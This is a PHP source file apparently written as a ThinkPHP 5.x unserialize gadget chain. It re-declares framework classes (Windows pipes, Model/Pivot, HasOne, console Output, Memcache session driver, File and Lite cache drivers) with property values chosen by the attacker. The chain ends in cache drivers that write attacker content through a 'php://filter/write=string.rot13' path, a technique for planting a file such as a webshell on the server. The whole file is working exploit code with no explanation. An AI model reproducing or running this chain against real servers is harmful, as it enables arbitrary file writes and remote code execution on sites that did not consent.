<?php
/**
 * Created by PhpStorm.
 * User: wh1t3P1g
 * Date: 2018/8/24
 * Time: 13:38
 */

namespace think\process\pipes {
    class Windows {
        private $files = [];

        public function __construct($files)
        {
            $this->files = array($files);
        }
    }
}

namespace think\model\relation{
    use think\model\Relation;

    abstract class OneToOne extends Relation {
        protected $bindAttr = [];
        function __construct($bindAttr, $selfRelation, $query)
        {
            $this->bindAttr = $bindAttr;
            parent::__construct($selfRelation, $query);
        }
    }

    class HasOne extends OneToOne {
        function __construct($bindAttr, $query)
        {
            parent::__construct($bindAttr, false, $query);
        }
    }
}

namespace think\db {
    class Query {
        protected $model;

        function __construct($model)
        {
            $this->model = $model;
        }
    }
}

namespace think {
    abstract class Model{
        protected $append = [];
        protected $data = [];
        protected $error = null;
        protected $parent;

        function __construct($output, $modelRelation)
        {
            $this->parent = $output;
            $this->data = array("wh1t3p1g"=>"");
            $this->append = array("wh1t3p1g"=>"getError");
            $this->error = $modelRelation;
        }
    }
}

namespace think\model {

    class Relation{
        protected $selfRelation;
        protected $query;

        function __construct($selfRelation, $query){
            $this->query = $query;
            $this->selfRelation = $selfRelation;
        }
    }

    class Pivot extends \think\Model{
        function __construct($output, $modelRelation)
        {
            parent::__construct($output, $modelRelation);
        }
    }
}

namespace think\console {
    class Output {
        protected $styles = [];
        private $handle = null;
        function __construct($handle){
            $this->styles = array("getAttr");
            $this->handle = $handle;
        }
    }
}

namespace think\session\driver {
    class SessionHandler {}

    class Memcache extends SessionHandler {

        protected $handler = null;
        protected $config = [];

        function __construct($handle, $filename){
            $this->handler = $handle;
            $this->config = array("session_name"=>$filename,"expire"=>"test");
        }
    }
}

namespace think\cache {
    abstract class Driver{
        protected $tag;
    }
}


namespace think\cache\driver {
    use think\cache\Driver;

    class File extends Driver {
        protected $options = [];

        function __construct($remote_path,$content){
            $this->options = array("path"=>"php://filter/write=string.rot13/resource=".$remote_path.$content,"cache_subdir"=>null,"prefix"=>null,"data_compress"=>null);
            $this->tag = true;
        }
    }

    class Lite extends Driver{
        protected $options = [];

        function __construct($remote_path, $content)
        {
            $this->options = array(
                "path"=>"php://filter/write=string.rot13/resource=".$remote_path.$content,
                "prefix"=>null,
            );
            $this->tag = true;
        }
    }
}